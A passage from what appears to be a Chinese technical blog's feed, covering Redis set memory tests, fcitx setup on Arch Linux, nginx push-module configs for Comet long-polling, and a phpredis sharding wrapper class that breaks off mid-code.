</dd>
</dl>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">Sets</h2>
<div class="outline-text-2" id="text-2">
<ul class="org-ul">
<li>测试脚本
<div class="org-src-container">

<pre class="src src-python"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/env python</span>

<span style="color: #b5bd68;">import</span> redis
<span style="color: #b5bd68;">import</span> math
<span style="color: #b5bd68;">import</span> time

<span style="color: #f0c674;">r</span> = redis.Redis(host=<span style="color: #8abeb7;">'localhost'</span>, port=6379, db=0)
<span style="color: #f0c674;">set_capcity</span> = <span style="color: #b294bb;">int</span>(r.config_get(<span style="color: #8abeb7;">"set-max-intset-entries"</span>)[<span style="color: #8abeb7;">"set-max-intset-entries</span><span style="color: #8abeb7; text-decoration: underline;">"</span><span style="text-decoration: underline;">])</span>

<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">set_name</span>(i, num_strings, set_capcity):
<span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">set_num</span> = math.ceil(num_strings/<span style="color: #b294bb;">float</span>(set_capcity))
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #8abeb7;">"s%d"</span>%(i%set_num)

<span style="color: #b5bd68;">for</span> num_strings <span style="color: #b5bd68;">in</span> (100000,):
<span style="background-color: #373b41;"> </span>   r.flushall()
<span style="background-color: #373b41;"> </span>   time.sleep(1.0)
<span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">initial_size</span> = r.dbsize()
<span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">initial_info</span> = r.info()

<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">for</span> i <span style="color: #b5bd68;">in</span> <span style="color: #b294bb;">xrange</span>(0, num_strings):
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">r.sadd("s", str(i))</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   r.sadd(set_name(i, num_strings, set_capcity), <span style="color: #b294bb;">str</span>(i))
<span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">final_size</span> = r.dbsize()
<span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">final_info</span> = r.info()

<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">print</span> <span style="color: #8abeb7;">"For %s strings."</span> % (num_strings,)
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">print</span> <span style="color: #8abeb7;">"Keys: %s =&gt; %s"</span> % (initial_size, final_size)
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">print</span> <span style="color: #8abeb7;">"Memory: %s =&gt; %s"</span> % (initial_info[<span style="color: #8abeb7;">'used_memory'</span>],
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   final_info[<span style="color: #8abeb7;">'used_memory'</span>])
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">print</span> <span style="color: #8abeb7;">"Memory per key: %d"</span>%((<span style="color: #b294bb;">int</span>(final_info[<span style="color: #8abeb7;">'used_memory'</span>]) - <span style="color: #b294bb;">int</span>(initial_in<span style="text-decoration: underline;">fo[</span><span style="color: #8abeb7; text-decoration: underline;">'used_memory'</span><span style="text-decoration: underline;">])) / num_strings)</span>
</pre>
</div>
</li>

<li>测试结果
<dl class="org-dl">
<dt> 启用压缩 </dt><dd>每个value占用4字节
</dd>
<dt> 不启用压缩 </dt><dd>每个value占用39字节
</dd>
</dl>
<p>
注意: redis的set仅当值为整型，压缩才会生效。
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">内存预留</h2>
<div class="outline-text-2" id="text-3">
<p>
除非你能够保证你的机器总是有一半的空闲内存，否则别使用快照方式持久化数据或者通过执行BGREWRITEAOF压缩aof文件。
redis在执行bgsave时，会进行一次fork，fork后的进程负责将内存中的数据写入磁盘，由于fork采用Copy-On-Write，两个redis进程共享内存中的数据。redis如果有数据更新，则会将对应的共享内存页创建一份副本再更新，当更新操作足够频繁时，共享的内存空间会迅速地副本化，导致物理内存被耗光，系统被迫动用交换空间，从而导致redis服务极不稳定，整个系统堵塞在磁盘io上。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Archlinux下安装fcitx输入法]]></title>
            <link>/article/archlinux-4e0b5b8988c5-fcitx-8f9351656cd5.html</link>
            <guid>/article/archlinux-4e0b5b8988c5-fcitx-8f9351656cd5.html</guid>
            <pubDate>Sat, 15 Dec 2012 13:56:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">安装</h2>
<div class="outline-text-2" id="text-1">
<div class="org-src-container">

<pre class="src src-sh">sudo yaourt -S fcitx-im
ln -s /etc/xdg/autostart/fcitx-autostart.desktop  ~/.config/autostart/
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">配置</h2>
<div class="outline-text-2" id="text-2">
<p>
在配置文件~/.xprofile中添加以下内容：
</p>
<pre class="example">
export GTK_IM_MODULE=fcitx
export QT_IM_MODULE=fcitx
export XMODIFIERS="@im=fcitx"
export LC_CTYPE="zh_CN.UTF-8"
</pre>

<p>
因为用的是gnome3桌面，需要禁用ibus：
</p>
<pre class="example">
gsettings set org.gnome.settings-daemon.plugins.keyboard active false
</pre>
<p>
还需要在键盘快捷键设置界面中将输入源切换的快捷键清除。
</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Nginx Comet: 基于 HTTP 长连接的“服务器推”技术]]></title>
            <link>/article/nginx-comet-57fa4e8e-http-957f8fde63a57684201c670d52a1566863a8201d6280672f.html</link>
            <guid>/article/nginx-comet-57fa4e8e-http-957f8fde63a57684201c670d52a1566863a8201d6280672f.html</guid>
            <pubDate>Fri, 14 Dec 2012 13:09:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">简介</h2>
<div class="outline-text-2" id="text-1">
<p>
可参考这篇文章：<a href="http://www.ibm.com/developerworks/cn/web/wa-lo-comet/">Comet：基于 HTTP 长连接的“服务器推”技术</a>
</p>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2"><a href="https://github.com/slact/nginx_http_push_module">nginx_http_push_module</a> （不建议使用）</h2>
<div class="outline-text-2" id="text-2">
<p>
这个模块功能上没有问题，网上介绍的文章相对比较多，但是存在严重的内存泄露问题，而且发现使用kill -HUP的方式优雅重启nginx虽会释放一部分内存，但nginx错误日志显示有共享内存锁相关的冲突，我们不得不每小时彻底重启一次nginx。简单说一下就是它使用一个全局的内存池来分配订阅者及响应需要的内存空间，但是从nginx内存池分配的小内存块（&lt; pagesize，4096）是不会释放的也不会归还到池中进行重用，具体可查看nginx源码的ngx_palloc和ngx_pfree函数进行验证。
</p>

<p>
可google "nginx中mod_push模块内存分配改造"，在作者的<a href="http://http://blog.lifeibo.com/">网站</a>正在改版暂时找不到该文章。
</p>

<p>
<a href="http://bsd.ee/~hadara/blog/?p=215=1">这里</a>也有人<a href="https://github.com/slact/nginx_http_push_module/pull/60">指出</a>该问题，同时该文作者也fork了一个分枝，但是我试了一下，除了不支持push_channel_timeout特性外，还是一样有内存泄露。
</p>

<dl class="org-dl">
<dt> 参考配置 </dt><dd></dd>
</dl>
<pre class="example">
location ~ ^/publish$ {
    allow 127.0.0.1;
    deny all;
    set $push_channel_id $arg_id;
    push_publisher;
    push_delete_oldest_received_message on;
    push_message_timeout 5s;
    #push_channel_timeout 60s;
    push_store_messages off;
}

location ~ ^/activity$ {
    if ($args ~ "callback=(.+)" ) {
        rewrite ^/activity "/activity_jsonp" last;
    }
    push_subscriber;
    push_subscriber_timeout 60s;
    push_subscriber_concurrency first;
    push_max_channel_subscribers 1;
    set $push_channel_id $arg_id;
    default_type application/json;
}

location ~ ^/activity_jsonp$ {
    push_subscriber;
    push_subscriber_timeout 60s;
    push_subscriber_concurrency first;
    push_max_channel_subscribers 1;
    set $push_channel_id $arg_id;
    default_type application/json;
    echo_before_body $arg_callback "(";
    echo_after_body ")";
}
</pre>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3"><a href="https://github.com/wandenberg/nginx-push-stream-module">nginx-push-stream-module</a> （建议使用）</h2>
<div class="outline-text-2" id="text-3">
<p>
由于 <a href="https://github.com/slact/nginx_http_push_module">nginx_http_push_module</a> 存在内存泄露问题，同时没有人进行正式的修复，我们决定尝试一下<a href="https://github.com/wandenberg/nginx-push-stream-module">nginx-push-stream-module</a>，这个模块功能更强大同时文档更完整，看起来也更活跃。
</p>

<dl class="org-dl">
<dt> 优点 </dt><dd><ul class="org-ul">
<li>更成熟
有内存消耗说明文档，便于决定共享内存容量配置。
有统计功能。
可对响应内容进行再处理。
</li>
<li>测试中未发现明显的内存泄露
</li>
<li>内置支持jsonp
返回的jsonp是这样的格式callback([text])，可以通过修改ngx_http_push_stream_module_utils.h中定义的NGX_HTTP_PUSH_STREAM_CALLBACK_INIT_CHUNK和NGX_HTTP_PUSH_STREAM_CALLBACK_END_CHUNK去除多余的中括号。
</li>
</ul>
</dd>

<dt> 参考配置 </dt><dd></dd>
</dl>
<pre class="example">
push_stream_store_messages off;
push_stream_max_subscribers_per_channel 1;
push_stream_subscriber_connection_ttl 60s;
push_stream_longpolling_connection_ttl 60s;

server {
    listen 80;
    server_name localhost 127.0.0.1;
    
    ...

    location ~ ^/publish$ {
        allow 127.0.0.1;
        deny all;
        push_stream_publisher admin;
        set $push_stream_channel_id $arg_id;
    }
    
    location ~ ^/activity$ {
        push_stream_subscriber long-polling;
        set $push_stream_channels_path $arg_id;
        push_stream_content_type "application/json";
        push_stream_message_template "~text~";
    }

    ...
}
</pre>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[当php遇上redis]]></title>
            <link>/article/5f53-php-90474e0a-redis.html</link>
            <guid>/article/5f53-php-90474e0a-redis.html</guid>
            <pubDate>Sat, 08 Dec 2012 05:41:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
在最近的项目中，我们需要在php中访问redis，我们选择了使用<a href="https://github.com/nicolasff/phpredis">phpredis</a>库，下面是遇到的一些问题。
</p>

<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">redis持久连接不靠谱。</h2>
<div class="outline-text-2" id="text-1">
<p>
可以说这是php的通病了，不管是mysql、memcache还是redis，指望由php本身（包含php扩展）来实现持久连接都是行不通的。
</p>

<dl class="org-dl">
<dt> 为什么这么说呢？ </dt><dd>     首先，所谓的持久连接的实现不外乎在进程（php-fpm）内建一个连接池，当php需要连接时，先以ip+port等信息为key在池中查找，找到则直接返回已有连接没有则新建连接。而当一个请求执行结束时，不关闭连接，而是把连接归还到池中。

<p>
这样当php需要用到多个redis实例时（分库），因为一个php-fpm进程会持有每个redis实例的一个连接，所以需要“php-fpm进程数“*“redis实例数"个redis连接，而对于每个redis服务器则有“php-fpm进程数“个客户端连接。
</p>

<p>
举个例子：一个web应用开了1000个php-fpm进程，有10个redis实例，那么保持的redis连接数就为1000*10也就是10000，每个redis实例有1000个客户端连接。如果前端或redis再扩容所需要的连接就会以乘积方式增加。一个redis实例有php-fpm进程数个连接的情况下表现如何呢，这就要好好测一测了，反正是每连接一线程的mysql是直接堵死了。
</p>
</dd>
</dl>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">RedisArray不靠谱。</h2>
<div class="outline-text-2" id="text-2">
<p>
RedisArray实现了一致性hash分布式，但是它在初始化的时候就会连接上每个实例，这在web应用中简直是胡闹，它对一致性hash实现得比较完善，结点失效、动态添加结点时重新hash都有处理，在万不得已进行水平扩容时，可能会用得上。
</p>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">需要自已关闭redis连接。</h2>
<div class="outline-text-2" id="text-3">
<p>
Redis的析构函数没有关闭redis连接，这会导致redis网络负载过高，要确保脚本结束时关闭连接，最好是能够封装一下Redis类再使用。
</p>

<dl class="org-dl">
<dt> 示例封装 </dt><dd></dd>
</dl>
<div class="org-src-container">

<pre class="src src-php"><span style="color: #969896; font-style: italic;">/// </span><span style="color: #969896; font-style: italic;">&#20998;&#24067;&#24335;Redis.</span>
<span style="color: #b5bd68;">class</span> <span style="color: #81a2be;">RedisShard</span> {
<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">/// </span><span style="color: #969896; font-style: italic;">&#26500;&#36896;&#20989;&#25968;.</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">public</span> <span style="color: #b5bd68;">function</span> <span style="color: #de935f;">__construct</span>($<span style="color: #f0c674;">shards</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #81a2be;">this</span>-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">reinit</span>($<span style="color: #f0c674;">shards</span>);
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">/// </span><span style="color: #969896; font-style: italic;">&#26512;&#26500;&#20989;&#25968;.</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">/// </span><span style="color: #969896; font-style: italic;">&#33050;&#26412;&#32467;&#26463;&#26102;&#65292;phpredis&#19981;&#20250;&#33258;&#21160;&#20851;&#38381;redis&#36830;&#25509;&#65292;&#36825;&#37324;&#28155;&#21152;&#33258;&#21160;&#20851;&#38381;&#36830;&#25509;&#25903;&#25345;.</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">/// </span><span style="color: #969896; font-style: italic;">&#21487;&#20197;&#36890;&#36807;&#25163;&#21160;unset&#26412;&#31867;&#23545;&#35937;&#24555;&#36895;&#37322;&#25918;&#36164;&#28304;.</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">public</span> <span style="color: #b5bd68;">function</span> <span style="color: #de935f;">__destruct</span>() {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">isset(</span>$<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">shard</span>)){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">shard</span>[<span style="color: #8abeb7;">'redis'</span>]-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">close</span>();
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">/// </span><span style="color: #969896; font-style: italic;">&#37325;&#26032;&#21021;&#22987;&#21270;.</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">public</span> <span style="color: #b5bd68;">function</span> <span style="color: #de935f;">reinit</span>($<span style="color: #f0c674;">shards</span>){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">index</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">shards</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span>($<span style="color: #f0c674;">shards</span> <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">shard</span>){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">shards</span>[$<span style="color: #f0c674;">index</span>] = <span style="color: #c5c8c6; background-color: #1d1f21;">explode(</span><span style="color: #8abeb7;">':'</span>, $<span style="color: #f0c674;">shard</span>); <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#26684;&#24335;&#65306;host:port:db</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">shards</span>[$<span style="color: #f0c674;">index</span>][<span style="color: #8abeb7;">'index'</span>] = $<span style="color: #f0c674;">index</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   ++$<span style="color: #f0c674;">index</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }<span style="color: #cc6666; background-color: #373b41;">        </span>
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">/// </span><span style="color: #969896; font-style: italic;">&#36716;&#21457;&#26041;&#27861;&#35843;&#29992;&#21040;&#30495;&#27491;&#30340;redis&#23545;&#35937;.</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">public</span> <span style="color: #b5bd68;">function</span> <span style="color: #de935f;">__call</span>($<span style="color: #f0c674;">name</span>, $<span style="color: #f0c674;">arguments</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">result</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">call_user_func_array(array(</span>$<span style="color: #81a2be;">this</span>-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">redis</span>($<span style="color: #f0c674;">arguments</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>]), $<span style="color: #f0c674;">name</span>)<span style="text-decoration: underline;">, $</span><span style="color: #f0c674; text-decoration: underline;">arguments</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">result</span> === <span style="color: #81a2be;">false</span> <span style="color: #b5bd68;">and</span> <span style="color: #c5c8c6; background-color: #1d1f21;">in_array(</span>$<span style="color: #f0c674;">name</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'set'</span>, <span style="color: #8abeb7;">'setex'</span>, <span style="color: #8abeb7;">'incr'</span>)))<span style="text-decoration: underline;"> {</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">trigger_error(</span><span style="color: #8abeb7;">"redis error: "</span> . $<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">shard</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>] . <span style="color: #8abeb7;">':'</span> . $<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">shard</span><span style="text-decoration: underline;">[</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">1</span><span style="text-decoration: underline;">] . </span><span style="color: #8abeb7; text-decoration: underline;">':'</span><span style="text-decoration: underline;"> .$</span><span style="color: #81a2be; text-decoration: underline;">this</span><span style="text-decoration: underline;">-&gt;</span><span style="color: #f0c674; text-decoration: underline;">shard</span><span style="text-decoration: underline;">[</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">2</span><span style="text-decoration: underline;">] . </span><span style="color: #8abeb7; text-decoration: underline;">" $name "</span><span style="text-decoration: underline;"> . </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">implode(</span><span style="color: #8abeb7; text-decoration: underline;">' '</span><span style="text-decoration: underline;">, $</span><span style="color: #f0c674; text-decoration: underline;">arguments</span><span style="text-decoration: underline;">), </span><span style="color: #81a2be; text-decoration: underline;">E_USER_NOTICE</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> $<span style="color: #f0c674;">result</span>;
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">/// </span><span style="color: #969896; font-style: italic;">&#33719;&#21462;1&#33267;max&#38388;&#30340;&#21807;&#19968;&#24207;&#21495;name&#65292;&#36798;&#21040;max&#21518;&#20250;&#20174;1&#24320;&#22987;.</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">/// </span><span style="color: #969896; font-style: italic;">redis&#30340;&#36882;&#22686;&#21040;&#26368;&#22823;&#20540;&#21518;&#20250;&#36820;&#22238;&#38169;&#35823;&#65292;&#26412;&#26041;&#27861;&#23454;&#29616;&#23433;&#20840;&#30340;&#36882;&#22686;&#12290;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">/// </span><span style="color: #969896; font-style: italic;">&#22833;&#36133;&#36820;&#22238;false&#65292;&#26368;&#35201;&#30830;&#20445;&#24050;&#29992;redis()&#26041;&#27861;&#36830;&#21040;&#29983;&#25104;&#24207;&#21495;&#30340;&#26576;&#20010;redis&#23545;&#35937;.</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">public</span> <span style="color: #b5bd68;">function</span> <span style="color: #de935f;">id</span>($<span style="color: #f0c674;">name</span>, $<span style="color: #f0c674;">max</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">isset(</span>$<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">shard</span>)){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">id</span> = $<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">shard</span>[<span style="color: #8abeb7;">'redis'</span>]-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">incr</span>(<span style="color: #8abeb7;">'_id_'</span> . $<span style="color: #f0c674;">name</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">id</span>){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">max</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">intval(</span>$<span style="color: #f0c674;">max</span>/<span style="color: #c5c8c6; background-color: #1d1f21;">count(</span>$<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">shards</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">id</span> % $<span style="color: #f0c674;">max</span> == <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span>($<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">shard</span>[<span style="color: #8abeb7;">'redis'</span>]-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">decrBy</span>(<span style="color: #8abeb7;">'_id_'</span> . $<span style="color: #f0c674;">name</span>, $<span style="color: #f0c674;">max</span>) &gt;=<span style="text-decoration: underline;"> $</span><span style="color: #f0c674; text-decoration: underline;">max</span><span style="text-decoration: underline;">){</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">id</span> = $<span style="color: #f0c674;">max</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">else</span> <span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">id</span> &gt; $<span style="color: #f0c674;">max</span>){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">id</span> %= $<span style="color: #f0c674;">max</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> ($<span style="color: #f0c674;">id</span> - <span style="color: #c5c8c6; background-color: #1d1f21;">1</span>)*<span style="color: #c5c8c6; background-color: #1d1f21;">count(</span>$<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">shards</span>) + ($<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">shard</span>[<span style="color: #8abeb7;">'index'</span>] +<span style="text-decoration: underline;"> </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">1</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #81a2be;">false</span>;
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">/// </span><span style="color: #969896; font-style: italic;">&#36830;&#25509;&#24182;&#36820;&#22238;key&#23545;&#24212;&#30340;redis&#23545;&#35937;.</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">public</span> <span style="color: #b5bd68;">function</span> <span style="color: #de935f;">redis</span>($<span style="color: #f0c674;">key</span>){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">TODO: crc32&#22312;32&#20301;&#31995;&#32479;&#19979;&#20250;&#36820;&#22238;&#36127;&#25968;&#65292;&#22240;&#25105;&#20204;&#26159;&#37096;&#32626;&#22312;64&#20301;&#31995;&#32479;&#19978;&#65292;&#26242;&#26102;&#24573;&#30053;.</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">assert(</span><span style="color: #cc6666; font-weight: bold;">PHP_INT_SIZE</span> === <span style="color: #c5c8c6; background-color: #1d1f21;">8</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">index</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">crc32(</span>$<span style="color: #f0c674;">key</span>) % <span style="color: #c5c8c6; background-color: #1d1f21;">count(</span>$<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">shards</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">shard</span> = $<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">shards</span>[$<span style="color: #f0c674;">index</span>];
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">isset(</span>$<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">shard</span>)){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#23581;&#35797;&#37325;&#29992;&#24050;&#26377;&#36830;&#25509;.</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">shard</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>] == $<span style="color: #f0c674;">shard</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>] <span style="color: #b5bd68;">and</span> $<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">shard</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>] == $<span style="color: #f0c674;">shard</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>]){
